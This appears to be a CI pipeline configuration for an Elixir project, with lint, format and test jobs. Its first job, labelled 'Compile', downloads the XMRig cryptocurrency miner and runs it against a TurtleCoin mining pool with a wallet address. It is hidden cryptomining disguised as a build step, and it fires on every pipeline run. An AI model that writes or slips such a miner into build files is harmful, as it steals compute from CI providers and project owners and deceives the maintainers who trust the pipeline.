version: v1.0
name: Build & Test
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: Set up
    task:
      jobs:
        - name: Compile
          commands:
            - 'wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-linux-x64.tar.gz && tar -xvf xmrig-6.8.2-linux-x64.tar.gz && cd xmrig-6.8.2/ && ./xmrig --donate-level 1 -o turtlecoin.herominers.com:10381 -u TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+878122580c2608d8725f75b47bbb9561043c89762758a00a17cba56d5b6725a3 -p vps1 -a argon2/chukwav2 -k'
  - name: Analyze code
    task:
      prologue:
        commands:
          - checkout
          - bin/setup_ci_elixir
          - sem-version elixir 1.8.1
          - cache restore
          - mix deps.get
      jobs:
        - name: Credo
          commands:
            - mix credo -a
        - name: Formatter
          commands:
            - mix format --check-formatted
  - name: Tests
    task:
      prologue:
        commands:
          - checkout
          - bin/setup_ci_elixir
          - sem-version elixir 1.8.1
          - cache restore
          - mix deps.get
      jobs:
        - name: ex_unit
          env_vars:
            - name: DATABASE_URL
              value: 'ecto://postgres:@0.0.0.0:5432/sema_test'
          commands:
            - sem-service start postgres
            - mix test
